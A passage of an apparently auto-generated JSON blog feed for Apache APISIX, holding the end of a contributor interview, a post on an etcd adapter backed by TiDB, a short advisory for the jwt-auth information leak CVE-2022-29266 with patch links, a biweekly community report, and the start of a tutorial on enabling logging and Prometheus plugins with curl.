expert\\" and \\"whether the question I ask is stupid.\\" In fact, we don\'t have to worry so much. Be brave to ask for advice, and no one will care about these details. Moreover, most companies that offer remote work advocate \\"**Remote First**\\" and open-minded communication really matters in remote collaboration.\\r\\n\\r\\nThe second problem is that people have not fully developed the habit of **Documenting Anything**. Documenting Anything is a common practice for many **Remote First** companies. This also explains why the Global Team I lead puts items on the mailing list. On the one hand, if there is a personnel change, new employees can have an idea of what happened in the Global Team and know what everyone has done and what they are doing now and the progress. On the other hand, if there is no written record, it will lead to information loss, and the cost for newcomers to get started is very high. Therefore, in my daily work, even if it is face-to-face communication, as long as it is not a private matter, I will move the conversation to a public channel, which can help us trace the source and sync the information to more people.\\r\\n\\r\\n**Remote work requires strong self-motivation from engineers. How do you stay motivated in your remote work?**\\r\\n\\r\\nFirst of all, we are a startup, so there are many things to do. Secondly, I wake up earlier in the morning, usually at 5 o\'clock, and then I will start planning my work for the day. I like being alone in the morning silence. In the early morning, I can do things very efficiently. Often before the meeting, I have already done all the work today, so I will read a book in the afternoon to relax a little. But most of the time, I will work simultaneously with my colleagues. As for me, there are too many things to do.\\r\\n\\r\\n**How do you balance your life and work?**\\r\\n\\r\\nI am trying to make a balance between work and life. From 2020 to now, I have worked an average of 13 hours a day. From the first day I came to the company, I said that I was here to start a business, so I have put a lot of energy into it. During the ten-hour work, I will work very efficiently because I have a clear idea of the work I need to do, the priorities, and the approach to different issues.\\r\\n\\r\\nFrom the end of 2020, I began to do some management work, and this year I lead a global team. Although our processes change constantly for improvement, all team members are on the right track, cooperating smoothly and aligning their actions with team goals. All the results will be verified by data. So at the end of the month, I will have a short vacation, slow down, and get recharged.\\r\\n\\r\\nFor the past two years, I have been dealing with company affairs. Starting from this month, I will sign up for public activities, do more public sharing, and talk about the Apache culture, Apache APISIX, and open-source communities.\\r\\n\\r\\n**Besides work, what other things are you interested in?**\\r\\n\\r\\nIt feels good to grow with a startup company. I consider my current job as a career and a hobby. I also care about education welfare. When I\'m free, I will join or organize freeCodeCamp activities, encouraging and helping people around me to learn computers and technology. When the community you are in is growing, you will grow too. It\'s also a cool thing to help them realize their ideas on their own.\\r\\n\\r\\nSometimes, I wonder what I will do if I don\'t code anymore. My blog signature is \\"use magic to defeat magic.\\" I think chemistry is a magical thing. When I was a child, I participated in BASF\'s activities and knew that BASF, a famous chemical company, was changing the world with chemistry. I am also interested in nature and biology and have read many encyclopedias related to the universe and nature.\\r\\n\\r\\nWhen I was in college, I also played drones, took aerial photos of the school with my friends, and then reproduced them into a video with Minecraft, which is available on Bilibili ([a promotional video of Henan Normal University](https://www.bilibili.com/video/BV1As411a7Mc?from=search&seid=7847808159839607455&spm_id_from=333.337.0.0)). We also used drones to shoot sunrise on the top of Mount Tai, help the hometown shoot various videos, and help schools broadcast various activities live.\\r\\n\\r\\n## Knowing More About Zhiyuan\\r\\n\\r\\nZhiyuan usually shares his recent thoughts and insights in his blogs. Through his words, we can see a young man exploring freely in open source, technology, work, and life. If you want to know more about Zhiyuan, you can subscribe to his [Blog](https://wineso.me/) and [GitHub](https://github.com/juzhiyuan).\\r\\n\\r\\nLooking forward to more exploration and sharing from Zhiyuan in the future!"},{"id":"High Availability Configuration with TiDB and APISIX","metadata":{"permalink":"/blog/2022/04/22/apisix-with-tidb-practice","source":"@site/blog/2022/04/22/apisix-with-tidb-practice.md","title":"High Availability Configuration with TiDB and APISIX","description":"The APISIX team presented TiDB and APISIX to realize configuration center in TiDB Hackathon 2021. This article will bring stories behind the project.","date":"2022-04-22T00:00:00.000Z","formattedDate":"April 22, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":10.915,"truncated":true,"authors":[{"name":"Chao Zhang","title":"Author","url":"https://github.com/tokers","image_url":"https://avatars.githubusercontent.com/u/10428333?v=4","imageURL":"https://avatars.githubusercontent.com/u/10428333?v=4"},{"name":"Estelle Rao","title":"Technical Writer","url":"https://github.com/EstelleRao","image_url":"https://github.com/EstelleRao.png","imageURL":"https://github.com/EstelleRao.png"}],"prevItem":{"title":"Interview with JU Zhiyuan: Becoming One of the 918 ASF Members, I Felt Thrilled and Proud","permalink":"/blog/2022/04/29/interview-juzhiyuan-apache-member"},"nextItem":{"title":"The Vulnerability of Leaking Information in Error Response from jwt-auth Plugin\uff08CVE-2022-29266\uff09","permalink":"/blog/2022/04/20/cve-2022-29266"}},"content":"> In the TiDB Hackathon 2021, the APISIX team (team leader: Chao Zhang, team members: Zeping Bai, Zhengsong Tu, Jinghan Chen) presented the ability of TiDB to interface with Apache APISIX to implement a universal configuration center. In this article, we will bring you some stories behind the project and the future outlook, if you are interested in the project, please feel free to participate in the project.\\n\\n\x3c!--truncate--\x3e\\n\\n## Project Background\\n\\nAs an important component of microservices architecture, API gateway is the core entry/exit of traffic, used to unify and process business-related requests, which can effectively solve the problems of massive requests and malicious access, and ensure business security and stability.\\n\\nAs an open source cloud-native API gateway, Apache APISIX has three advantages: dynamic, real-time, and high-performance. It provides rich traffic management features such as load balancing, dynamic upstream, grayscale publishing, service fusion, authentication, and observability, helping enterprises to handle API and microservice traffic quickly and securely. Ingress and Service Grid scenarios.\\n\\nApache APISIX also supports high customization, Wasm support, and plugin written in Java, Go, Python, and other major computer languages.\\n\\n### Apache APISIX Technical Architecture\\n\\nApache APISIX adopts an architecture that separates the data plane from the control plane, receiving and distributing configurations through the configuration center so that the data plane is not affected by the control plane.\\n\\n![APISIX Architecture](https://static.apiseven.com/202108/1650769844333-c2d90f33-8138-49cc-a511-0e96b75b47e8.png)\\n\\nIn this architecture, the data plane receives and processes caller requests and dynamically controls request traffic using Lua and NGINX, which can be used to manage the full lifecycle of API requests. The control plane contains the Manager API and the default configuration center etcd, which is used to manage the API gateways. When an administrator accesses and operates the console, the console calls the Manager API to send the configuration to etcd, which takes effect in real time on the gateway thanks to the etcd watch mechanism.\\n\\nThe default configuration center is etcd, which also supports Consul, Nacos, Eureka, etc. etcd naturally supports distributed, high availability, clustering, and has a lot of practice in K8s, etc. APISIX can easily support millisecond configuration updates, thousands of gateway nodes, and the gateway nodes are stateless and can be expanded and reduced at will.\\n\\n### Limitations of etcd\\n\\n#### Architectural issues\\n\\nFirst of all, etcd is based on BoltDB and has an upper limit. etcd\'s default storage limit is 2 GB, and if the limit requires more than 2 GB, you can configure the storage with the `-quota-backend-bytes` flag, which can be adjusted up to 8 GB. An etcd cluster with 8 GB of storage is enough to serve one gateway, but if it serves N APISIX clusters at the same time, the capacity may not be enough. but if it serves N APISIX clusters at the same time, it may not have enough capacity and may cause some problems.\\n\\nSecondly, etcd is essentially a CP system and cannot host a large number of client connections. Because etcd is distributed consensus through Raft, all read and write requests will be processed by the Leader of Raft, and a large number of client connections may lead to a high load on the whole cluster, which may affect the caller.\\n\\n#### Scenario issues\\n\\nIn scenarios such as Ingress and Service Mesh, the use of etcd is relatively overloaded, and some users do not want to deploy components other than the control plane and data plane. For example, NGINX Ingress Controller can run with just one image, but APISIX Ingress Controller has an etcd in addition to the Ingress Controller control plane and APISIX data plane. For users, this technical architecture is more expensive to deploy, and they have to ensure the operation and maintenance of etcd.\\n\\nK8s itself supports storage services, and all configuration information and Endpoints stored in the APISIX backend can be obtained from the K8s API Server. Using etcd in this scenario would make the whole selection more unwieldy.\\n\\nThe same is true for service grids. If you use APISIX in a Service Grid scenario and deploy etcd as well, the whole selection will be heavy. And in a service grid scenario, the number of Pods can be hundreds or even tens of thousands, which is very common. If all the tens of thousands of Pods are connected to etcd, etcd will become the bottleneck of the whole service.\\n\\n#### Cost issues\\n\\nFirst, etcd has high operation and maintenance costs, and some companies do not have dedicated etcd operation and maintenance engineers. At least 3-5 instances are needed to deploy etcd, and after etcd is running successfully, data backups and snapshots need to be done regularly. In order to monitor the operation of etcd and understand the health of etcd in real time, you also need to build an observable system to provide the necessary alerting support. If a company does not have dedicated etcd operations and maintenance engineers, it may not be able to do a good job of etcd operations and maintenance.\\n\\nSecond, some companies or organizations have long-standing middleware or infrastructure, and switching configuration centers can be costly. For these companies or organizations, they often prefer to reuse existing middleware or infrastructure as the configuration center of APISIX, such as TiDB, Consul, and Apache ZooKeeper, so as to converge the technology stack and avoid additional costs.\\n\\n## Project Motivation\\n\\nBased on the above considerations, we decided to research a new solution to change the current overloaded technical architecture, provide more flexible options for Apache APISIX users, not bound by etcd, relieve the pressure of etcd operation and maintenance for existing users, reduce operation and maintenance costs, and at the same time expect to give users more and better choices, break through the bottleneck of etcd itself.\\n\\nUnbinding APISIX from etcd gives users more and more flexible choices, which is actually the charm of open source. If we can remove this layer of restriction and not limit how users can use it, they may create more surprises.\\n\\n## Project Introduction\\n\\n### Solution Design\\n\\n#### How to decouple APISIX and etcd?\\n\\nThe first issue we considered at the beginning of the project design was how to decouple APISIX from etcd, because APISIX\'s careful code and data structures are closely related to etcd. The Admin API, which is responsible for manipulating the configuration, usually includes the metadata of etcd in the return value.\\n\\nFor example, etcd v3\'s Revision, etcd v2\'s createdIndex, modifiedIndex, and even in APISIX\'s core logic, a route or an Upstream object will carry this metadata.\\n\\nIt would be prohibitively expensive to fundamentally transform APISIX. Modifying such a core area may also affect the existing stability of APISIX, so directly modifying APISIX may not be a good solution.\\n\\n#### Introducing an additional middle layer\\n\\nIf direct transformation is too costly and risky, can we not consider introducing an extra layer of middle layer? There is a famous saying in the computer world - \\"there is no problem that cannot be solved by adding a layer\\". If we were to add a layer, what specific things would this layer be responsible for? What are the things to be done? To summarize, this layer needs to accomplish two more important things.\\n\\nFirst, this additional middle tier needs to provide the etcd v3 API and support the etcd gRPC Gateway; currently, APISIX only supports etcd v3. For APISIX, this middle tier is still an etcd, and it must provide the etcd v3 API. Gateway, because APISIX still interacts with etcd via HTTP protocol, and the etcd v3 API is based on gRPC, we need etcd\'s gRPC Gateway to convert HTTP requests into gRPC requests, so that the whole interaction can proceed smoothly.\\n\\nSecond, this extra middle layer can interface with different storage solutions. We need to figure out how to support TiDB, PostgreSQL, SQLite, and even Consul and Apachce ZooKeeper.\\n\\nOnly when these two things are done can this middle tier interface to different storage solutions and thus bring the full configuration center functionality to APISIX.\\n\\n## Program Implementation\\n\\n![architectural design diagram](https://static.apiseven.com/202108/1650769803987-7a297f15-baa7-4817-8d3a-89a99a76c94b.png)\\n\\nOnce we have this middle tier, how do we integrate TiDB? We actually have a similar project to look at. Although K8s natively supports etcd as a storage solution, Rancher\'s [K3s](https://github.com/k3s-io/kine) project doesn\'t use etcd, probably because if K3s is deployed in some embedded environment, etcd has some limitations that make it not well maintained. So, Rancher supports additional components such as PostgreSQL, MySQL, SQLite, and Dqlite through the Kine project, giving K3s users the flexibility to choose other storage options. To summarize, Kine project has the following points that we should learn from.\\n\\nFirst, TiDB is compatible with MySQL, and Kine project itself supports MySQL, so we can borrow or refer to some implementations of Kine to help our project better support and interface with TiDB.\\n\\nSecond, Kine completely implements the watch function that etcd needs to support. Because APISIX is based on push mode to sense configuration changes, the latency of configuration changes is usually in millisecond level, which is very low. The watch mechanism is very important because it involves pushing the configuration.\\n\\nThird, Kine also emulates the MVCC feature of etcd to support Compact, where each change, write, update or delete is a row of data in Kine or TiDB. The primary key for each row of data is etcd\'s Revision, which is a counter that keeps track of the number of recent changes. In this way, Kine implements multi-version support.\\n\\nBy introducing a similar architecture, Apache APISIX does not have to interact with the real storage center, but with this intermediate layer. As shown above, the APISIX and etcd adapter middle tier goes through etcd\'s KV API and Watch API. etcd adapter polls TiDB, senses configuration writes, completes the watch operation, and thus pushes the data to APISIX.\\n\\n## Solution: the etcd adapter\\n\\nWith these thoughts and the reference of the Kine project, we have developed the [etcd adapter](https://github.com/api7/ETCD-adapter) project on the shoulders of giants.\\n\\nFirst of all, this project supports TiDB, MySQL and In-Memory B-Tree configuration centers, and soon SQLite and PostgreSQL. If you choose the In-Memory B-tree option, you can directly embed the etcd adapter into the target application. This way there is one less component, which can further improve the overall user experience.\\n\\nSecond, the project supports the etcd v3 API, which currently supports only a subset of the APIs required by APISIX, such as the KV API and the Watch API, while other types of APIs, such as Lease and authentication-based APIs, are not yet fully implemented.\\n\\nFinally, the project supports the gRPC Gateway, which translates the corresponding gRPC interface into the corresponding Restful interface for APISIX to call.\\n\\nAlthough we put the etcd adapter on the control plane, we can also put it on the side of each APISIX as a sidecar. Each of the two options has its own benefits, so you can choose flexibly according to your actual situation.\\n\\n## Future Plans\\n\\nWe have the following ideas to share with you about the follow-up plan and future direction of this project.\\n\\n### Provide more configuration center options for Apache APISIX users\\n\\nWe hope that the etcd adapter project will give Apache APISIX users more choices of configuration centers, so that they will not be locked by etcd and can choose solutions according to their actual situation. Consul KV is also based on Raft and has high availability. In addition, you can also consider the more mainstream Apollo or Apache ZooKeeper, which is the counterpart of etcd, and PostgreSQL or other alternatives\\n\\n### Contribute to the architectural improvement of Apache APISIX Ingress Controller\\n\\nWe hope that the etcd adapter project will help improve the architecture of APISIX Ingress Controller. etcd adapter supports In-Memory B-Tree, which embeds data into memory without the need for physical storage.\\n\\nIn this way, the etcd adapter can become part of the APISIX Ingress Controller, and the Apache Ingress Controller only needs to keep the Ingress Controller control plane and the APISIX data plane components. Since there is no etcd, APISIX can even interact directly with the Ingress Controller to get configuration change data.\\n\\nIn addition, we can also put the Ingress Controller control plane and APISIX data plane in the same image, so that the control plane and data plane can be deployed as one. In the end, we only need one command and one image to run APISIX Ingress Controller in K8s target cluster. If the control plane and data plane are put together, people don\'t need to deploy an additional etcd and a control plane, which is equivalent to two less components directly and can greatly improve the user experience.\\n\\n### Donated to the Apache Foundation for incubation as an Apache APISIX subproject\\n\\nCurrently, this [project](https://github.com/api7/etcd-adapter) is sitting in the API7.ai repository. In the future, we hope to continue to polish this project, and when it has been iteratively improved, we will donate it to the Apache Software Foundation to incubate it as a sub-project of Apache APISIX, so as to attract more people from the community to improve this project with us and make the Apache APISIX ecosystem even bigger."},{"id":"The Vulnerability of Leaking Information in Error Response from jwt-auth Plugin\uff08CVE-2022-29266\uff09","metadata":{"permalink":"/blog/2022/04/20/cve-2022-29266","source":"@site/blog/2022/04/20/cve-2022-29266.md","title":"The Vulnerability of Leaking Information in Error Response from jwt-auth Plugin\uff08CVE-2022-29266\uff09","description":"In APISIX 2.13.0 and previous versions, there is a problem of information leakage caused by the `jwt- auth` plugin.","date":"2022-04-20T00:00:00.000Z","formattedDate":"April 20, 2022","tags":[{"label":"Vulnerabilities","permalink":"/blog/tags/vulnerabilities"}],"readingTime":1.025,"truncated":true,"authors":[],"prevItem":{"title":"High Availability Configuration with TiDB and APISIX","permalink":"/blog/2022/04/22/apisix-with-tidb-practice"},"nextItem":{"title":"Biweekly Report (Apr 1 - Apr 14)","permalink":"/blog/2022/04/20/weekly-report-0420"}},"content":"> In APISIX 2.13.0 and previous versions, there is a problem of information leakage caused by the `jwt- auth` plugin.\\n\\n\x3c!--truncate--\x3e\\n\\n## Problem Description\\n\\nThe `jwt- auth` plugin has a security problem of leaking the user\'s secret key because the error message returned from the dependent library `lua-resty-jwt` contains sensitive information.\\n\\n## Affected Versions\\n\\nApache APISIX 2.13.0 and all previous versions\\n\\n## Solution\\n\\n1. Please upgrade to Apache APISIX 2.13.1 or above immediately.\\n2. If it is not convenient to update the version, install the corresponding version of the patch on Apache APISIX to implement refactoring to bypass the vulnerability (after the patch is installed and takes effect, the error message received by the caller will be the fixed error message and will no longer contain sensitive information).\\n\\nThe following patches apply to LTS 2.13.x or major versions:\\n\\n- https://github.com/apache/apisix/pull/6846\\n- https://github.com/apache/apisix/pull/6847\\n- https://github.com/apache/apisix/pull/6858\\n\\nThe following patches apply to the latest version of LTS 2.10.x:\\n\\n- https://github.com/apache/apisix/pull/6847\\n- https://github.com/apache/apisix/pull/6855\\n\\n## Vulnerability details\\n\\nSeverity\uff1aUrgent\\n\\nVulnerability public date: April 20, 2022\\n\\nCVE details: https://nvd.nist.gov/vuln/detail/CVE-2022-29266\\n\\n## Contributor Profile\\n\\nThe vulnerability was discovered and reported by Tang Zhongyuan, Xie Hongfeng and Chen Bing of Kingdee Software (China). Thank you for your contribution to the Apache APISIX community.\\n\\n![Kingdee logo](https://static.apiseven.com/202108/1650768035541-306d3c7d-cbd4-4b79-ad9c-9f916549b8e7.png)"},{"id":"Biweekly Report (Apr 1 - Apr 14)","metadata":{"permalink":"/blog/2022/04/20/weekly-report-0420","source":"@site/blog/2022/04/20/weekly-report-0420.md","title":"Biweekly Report (Apr 1 - Apr 14)","description":"The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community.","date":"2022-04-20T00:00:00.000Z","formattedDate":"April 20, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.7,"truncated":true,"authors":[],"prevItem":{"title":"The Vulnerability of Leaking Information in Error Response from jwt-auth Plugin\uff08CVE-2022-29266\uff09","permalink":"/blog/2022/04/20/cve-2022-29266"},"nextItem":{"title":"API Observability with APISIX Plugins","permalink":"/blog/2022/04/17/api-observability"}},"content":"> From April 1st to  April 14th, 36 contributors submitted 75 commits for Apache APISIX. Thank you all for your contributions to Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community from the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements cannot be achieved without the joint efforts of our community partners.\\n\\n\\"If you want to go fast, go alone.If you want to go far, go together.\\" The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community and and facilitate everyone to participate in the Apache APISIX community.\\n\\nWe have also compiled some issues suitable for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Contributors List](https://static.apiseven.com/202108/1650443415345-e067c6d9-1f39-4152-a7cc-4379fd4f17f3.jpg)\\n\\n![New Contributors](https://static.apiseven.com/202108/1650443438975-33d7f4fb-01ca-4877-848e-35b1f6869d2a.png)\\n\\n## Good first issue\\n\\n### Issue #6803\\n\\n**Link**: https://github.com/apache/apisix/issues/6803\\n\\n**Issue description**:\\n\\nWhen use `openid-connect` plugins with the wrong `redirect_uri` in Apache APISIX, as shown below:\\n\\n```Bash\\n   \\"plugins\\":{\\n        \\"openid-connect\\":{\\n             ...\\n            \\"scope\\":\\"openid profile\\",\\n            \\"bearer_only\\":false,\\n            \\"introspection_endpoint_auth_method\\":\\"client_secret_post\\",\\n            \\"redirect_uri\\":\\"http://127.0.0.1:9080/\\"\\n             ...\\n        }\\n    },\\n```\\n\\nThen, request the \\"127.0.0.1:9080/\\", will get 500, and the error log is as follow:\\n\\n![500 Error](https://static.apiseven.com/202108/1650443701999-958f2096-d44d-4cd0-99b5-6e8833c361c6.png)\\n\\n```YAML\\n2022/04/07 17:13:50 [error] 31780#3492140: *1959 [lua] openidc.lua:1378: authenticate(): request to the redirect_uri path but there\'s no session state found, client: 127.0.0.1, server: _, request: \\"GET / HTTP/1.1\\", host: \\"127.0.0.1:9080\\"\\n2022/04/07 17:13:50 [error] 31780#3492140: *1959 [lua] openid-connect.lua:304: phase_func(): OIDC authentication failed: request to the redirect_uri path but there\'s no session state found, client: 127.0.0.1, server: _, request: \\"GET / HTTP/1.1\\", host: \\"127.0.0.1:9080\\"\\n```\\n\\nThis type of log is very unclear and the user does not know what to expect. Error logging should be improved to improve the experience of using the `Openid-connect` plug-in.\\n\\n### Issue #6797\\n\\n**Link**:https://github.com/apache/apisix/issues/6797\\n\\n**Issue description**:\\n\\nWhen using the `file-logger` plugin, it is possible to send the logging to stdout by defining `/dev/stdout`. This in order to use the docker output and relais this in kubernetes to a ELK stack. Though an error is thrown indicating a permission denied for the current user.failed to open file: `/dev/stdout`, error info: `/dev/stdout`: Permission denied while logging request\\n\\n## Highlights of Recent Features\\n\\n- [Add the function of hiding header for `key-auth` plugin](https://github.com/apache/apisix/pull/6670)(Contributor: [bin-ya](https://github.com/bin-ya))\\n\\n- [Support ZooKeeper service discovery](https://github.com/apache/apisix/pull/6751)(Contributor: [shuaijinchao](https://github.com/shuaijinchao))\\n\\n- [Feat(`request-id`): add algorithm support nanoid](https://github.com/apache/apisix/pull/6779)\uff08Contributor: [aikin-vip](https://github.com/aikin-vip))\\n\\n- [Feat(`response-rewrite`): support filters](https://github.com/apache/apisix/pull/6750)(Contributor: [kwanhur](https://github.com/kwanhur))\\n\\nThe Apache APISIX project website and the Github issue have accumulated a wealth of documentation and experience, so if you encounter problems, you can read the documentation, search the issue with keywords, or participate in the discussion on the issue to put forward your own ideas and practical experience.\\n\\n## Recent Blog Recommendations\\n\\n- [Apache APISIX Summit ASIA 2022: API Gateway, Service Mesh and Open Source Ecology](https://apisix.apache.org/blog/2022/04/12/apisix-summit-asia-2022)\\n\\nSince Apache APISIX was officially open sourced on June 6, 2019, it has been growing rapidly as a community. In just over two years, the number of global contributors has exceeded 400, and the number is still growing rapidly. During this time, the Apache APISIX community has also successively gained recognition from domestic and foreign developers.\\n\\nThe Apache APISIX community will organize the Apache APISIX Summit ASIA 2022 on May 20-21, 2022.\\n\\n[Click here](https://apisix-summit.org) to register for Apache APISIX Summit ASIA 2022."},{"id":"API Observability with APISIX Plugins","metadata":{"permalink":"/blog/2022/04/17/api-observability","source":"@site/blog/2022/04/17/api-observability.md","title":"API Observability with APISIX Plugins","description":"This article describes the power of some Apache APISIX Observability Plugins, how to set up these plugins and use them to understand API behavior.","date":"2022-04-17T00:00:00.000Z","formattedDate":"April 17, 2022","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"}],"readingTime":6.78,"truncated":true,"authors":[{"name":"Boburmirzo","title":"Author","url":"https://github.com/Boburmirzo","image_url":"https://avatars.githubusercontent.com/u/14247607?v=4","imageURL":"https://avatars.githubusercontent.com/u/14247607?v=4"}],"prevItem":{"title":"Biweekly Report (Apr 1 - Apr 14)","permalink":"/blog/2022/04/20/weekly-report-0420"},"nextItem":{"title":"Apache APISIX Summit ASIA 2022 is coming","permalink":"/blog/2022/04/12/apisix-summit-asia-2022"}},"content":"> This article describes the power of some Apache APISIX Observability Plugins, how to set up these plugins and use them to understand API behavior.\\n\\n\x3c!--truncate--\x3e\\n\\n![Cover image for API Observability with Apache APISIX Plugins](https://static.apiseven.com/202108/1650506677636-f4d1ffa0-d848-4264-b497-de1061da0faf.png)\\n\\n## APIs are everywhere\\n\\nAPIs \u2014 by now, we\'re all familiar with the term. Every service we use today either uses an API or is an API itself. APIs are central in building and delivering your services. Also, you know that the success of your services depends on the integrity, availability, and performance of your APIs.\\n\\nNowadays\xa0**API Observability**\xa0is already a part of every API development as it addresses many problems related to API consistency, reliability, and the ability to quickly iterate on new API features. When you design for full-stack observability, you get everything you need to find issues and catch breaking changes.\\n\\nAPI observability can help every team in your organization:\\n\\n* Sales and growth teams to monitor your API usage, free trials, observe expansion opportunities and ensure that API serves the correct data.\\n\\n* Engineering teams to monitor and troubleshoot API issues.\\n\\n* Product teams to understand API usage and business value.\\n\\n* Security teams to detect and protect from API threats.\\n\\n## A central point for observation\\n\\nWe know that an API gateway offers a central control point for incoming traffic to a variety of destinations but it can also be a central point for observation as well since it is uniquely qualified to know about all the traffic moving between clients and our service networks. Instead of spending time integrating your services with other many APIs and technologies to improve observability, you can easily manage all work with\xa0[Apache APISIX Plugins](https://apisix.apache.org/plugins).\\n\\n![A central point for observation](https://static.apiseven.com/202108/1650506058593-265ec5da-4b0b-49f0-add4-cabd4a4f52cb.png)\\n\\nMost observability platforms like (Prometheus, SkyWalking, and Opentelemetry) provide pre-built connectors that you can easily integrate with Apache APISIX. You can leverage these connectors to ingest log data from your API gateways to further derive useful metrics and gain complete visibility into the usage, management performance, and security of your APIs in your environment.\\n\\nThe core of observability breaks down into **three key areas**: structured logs, metrics, and traces. Let\u2019s break down each pillar of API observability and learn how with Apache APISIX Plugins we can simplify these tasks and provides a solution that you can use to better understand API usage.\\n\\n![Observability of three key areas](https://static.apiseven.com/202108/1650506177111-04b43058-d8e1-426d-97e4-ac1d0a8c4b3e.png)\\n\\n## Prerequisites\\n\\nBefore enabling our plugins we need to install Apache APISIX, create a route, an upstream, and map the route to the upstream. You can simply follow\xa0[getting started guide](https://apisix.apache.org/docs/apisix/getting-started)\xa0provided on the website.\\n\\n## Logs\\n\\n**Logs**\xa0are also easy to instrument and trivial steps of API observability, they can be used to inspect API calls in real-time for debugging, auditing, and recording time-stamped events that happened over time. There are several logger plugins Apache APISIX provides such as:\\n\\n* [http-logger](https://apisix.apache.org/docs/apisix/plugins/http-logger/)\\n\\n* [skywalking-logger](https://apisix.apache.org/docs/apisix/plugins/skywalking-logger/)\\n\\n* [tcp-logger](https://apisix.apache.org/docs/apisix/plugins/tcp-logger)\\n\\n* [kafka-logger](https://apisix.apache.org/docs/apisix/plugins/kafka-logger)\\n\\n* [rocketmq-logger](https://apisix.apache.org/docs/apisix/plugins/rocketmq-logger)\\n\\n* [udp-logger](https://apisix.apache.org/docs/apisix/plugins/udp-logger)\\n\\n* [clickhouse-logger](https://apisix.apache.org/docs/apisix/plugins/clickhouse-logger)\\n\\n* [error-logger](https://apisix.apache.org/docs/apisix/plugins/error-log-logger)\\n\\n* [google-cloud-logging](https://apisix.apache.org/docs/apisix/plugins/google-cloud-logging)\\n\\nAnd you can see the [full list](https://apisix.apache.org/docs/apisix/plugins/zipkin) on the official website of Apache APISIX. Now for demo purposes, let\'s choose a simple but mostly used _http-logger_ plugin that is capable of sending API Log data requests to HTTP/HTTPS servers or sends as JSON objects to Monitoring tools. We can assume that a route and an upstream are created. You can learn how to set up them in the **[Getting started with Apache APISIX](https://youtu.be/dUOjJkb61so)** video tutorial. Also, you can find all command-line examples on the GitHub page [apisix-observability-plugins](https://boburmirzo.github.io/apisix-observability-plugins/).\\n\\nYou can generate a mock HTTP server at\xa0[mockbin.com](https://mockbin.org/)\xa0to record and view the logs. Note that we also bind the route to an upstream (You can refer to this documentation to learn about more\xa0[core concepts of Apache APISIX](https://apisix.apache.org/docs/apisix/architecture-design/apisix)).\\n\\nThe following is an example of how to enable the http-logger for a specific route.\\n\\n```\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 \\\\-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"plugins\\": {\\n          \\"http-logger\\": {\\n              \\"uri\\": \\"http://mockbin.org/bin/5451b7cd-af27-41b8-8df1-282ffea13a61\\"\\n          }\\n     },\\n    \\"upstream_id\\": \\"1\\",\\n    \\"uri\\": \\"/get\\"\\n}\'\\n```\\n\\n> To http-logger plugin settings, your can just put your mock server URI address like below:\\n\\n```\\n{\\"uri\\": \\"http://mockbin.org/bin/5451b7cd-af27-41b8-8df1-282ffea13a61\\"}\\n```\\n\\nOnce we get a successful response from APISIX server, we can send a request to this\xa0_get_\xa0endpoint to generate logs.\\n\\n```\\ncurl -i http://127.0.0.1:9080/get\\n```\\n\\nThen if you click and navigate to the following [mock server link](http://mockbin.org/bin/5451b7cd-af27-41b8-8df1-282ffea13a61/log) some recent logs are sent and we can see them:\\n\\n![http-logger-plugin-test-screenshot](https://static.apiseven.com/202108/1650506211706-09f0bb8a-9d63-4b5c-ae5f-01be1a76a9ba.png)\\n\\n## Metrics\\n\\n**Metrics**\xa0are a numeric representation of data measured over intervals of time. You can also aggregate this data into daily or weekly frequency and run queries against a distributed system like\xa0[Elasticsearch](https://www.elastic.co/). Or sometimes based on metrics you trigger alerts to take any action later. Once API metrics are collected, you can track them with metrics tracking tools such as\xa0[Prometheus](https://prometheus.io/).\\n\\nApache APISIX API Gateway also offers\xa0[prometheus-plugin](https://apisix.apache.org/docs/apisix/plugins/prometheus/)\xa0to fetch your API metrics and expose them in Prometheus. Behind the scene, Apache APISIX downloads the Grafana dashboard meta, imports it to\xa0[Grafana](https://grafana.com/), and fetches real-time metrics from the Prometheus plugin.\\n\\nLet\u2019s enable prometheus-plugin for our route:\\n\\n```\\n    curl http://127.0.0.1:9080/apisix/admin/routes/1  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"uri\\": \\"/get\\",\\n    \\"plugins\\": {\\n        \\"prometheus\\":{}\\n    },\\n    \\"upstream_id\\": \\"1\\"\\n}\\n```\\n\\nWe fetch the metric data from the specified URL\xa0`/apisix/prometheus/`metrics.\\n\\n```\\ncurl -i http://127.0.0.1:9091/apisix/prometheus/metrics\\n```\\n\\nYou will get a response with Prometheus metrics something like below:\\n\\n```\\nHTTP/1.1 200 OK\\nServer: openresty\\nDate: Fri, 25 Mar 2022 11:13:14 GMT\\nContent-Type: text/plain; charset=utf-8\\nTransfer-Encoding: chunked\\nConnection: keep-alive\\n# HELP apisix_batch_process_entries batch process remaining entries\\n# TYPE apisix_batch_process_entries gauge\\napisix_batch_process_entries{name=\\"http logger\\",route_id=\\"1\\",server_addr=\\"172.19.0.8\\"} 0\\n# HELP apisix_etcd_modify_indexes Etcd modify index for APISIX keys\\n# TYPE apisix_etcd_modify_indexes gauge\\napisix_etcd_modify_indexes{key=\\"consumers\\"} 17819\\napisix_etcd_modify_indexes{key=\\"global_rules\\"} 17832\\napisix_etcd_modify_indexes{key=\\"max_modify_index\\"} 20028\\napisix_etcd_modify_indexes{key=\\"prev_index\\"} 18963\\napisix_etcd_modify_indexes{key=\\"protos\\"} 0\\napisix_etcd_modify_indexes{key=\\"routes\\"} 20028\\n...\\n```\\n\\nAnd we can also check the status of our endpoint at the Prometheus dashboard by pointing to this URL `http://localhost:9090/targets`.\\n\\n![plugin-orchestration-configure-rule-screenshot](https://static.apiseven.com/202108/1650506275118-b49f881f-caff-4d9a-aedc-01e95e45c77f.png)\\n\\nAs you can see, Apache APISIX exposed metrics endpoint is upon and running.\\n\\nNow you can query metrics for\xa0`apisix_http_status`\xa0to see what HTTP requests are handled by API Gateway and what was the 